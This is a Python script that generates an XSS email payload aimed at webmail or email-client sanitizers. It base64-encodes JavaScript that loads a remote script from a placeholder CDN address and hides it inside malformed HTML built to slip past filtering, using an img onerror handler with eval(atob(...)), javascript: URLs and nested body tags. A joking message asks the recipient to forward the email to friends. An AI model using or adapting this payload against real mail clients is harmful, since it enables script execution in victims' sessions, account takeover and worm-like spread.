# -*- coding: utf-8 -*-

import base64
import argparse

def main(file_name):
    var_command = base64.b64encode(bytes("var s=document.createElement('script'); s.src='<XSS Script CDN Address>'; document.getElementsByTagName('head')[0].appendChild(s);", 'utf-8'))
    str_var_command = str(var_command).strip("b'")
    html_command = "<html><body><p>Hello Sir! </br>My name is Rajneesh. I am a beginner-hacker. </br>I get up early morning at 7 o'clock and doing my hacking exersizes.</br>I go to my server every morning by UDP-BUS at 8 o'clock.</br>Please help me and allow to run my JS in your e-mail client.</br>Also forward this email to all your friends.</br>Thank you!</br></p><html><body background=\"javascript:p()\"><!-- html ignored --><body x-washed=\"background\"></body><html><body><img fill='asd:url(#asd)\" src=\"x\" onerror=p()' /><body><img style=\"display:none\" fill=\"asd:url(#asd)&quot; src=&quot;x&quot; onerror=&quot;eval(atob('" + str_var_command + "'))\" /></body><html><math href=\"javascript:p();\"><mi></mi></math><!-- html ignored --><body><math x-washed=\"href\"><mi></mi></math></body>"
    base64_command = base64.b64encode(bytes(html_command, 'utf-8'))
    result_string = str_var_command = str(base64_command).strip("b'")
    try:
        file_name.write(result_string)
    except KeyError:
        print(KeyError)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('file', type=argparse.FileType('w', encoding='UTF-8'))
    args = parser.parse_args()
    with args.file as file_name:
        main(file_name)
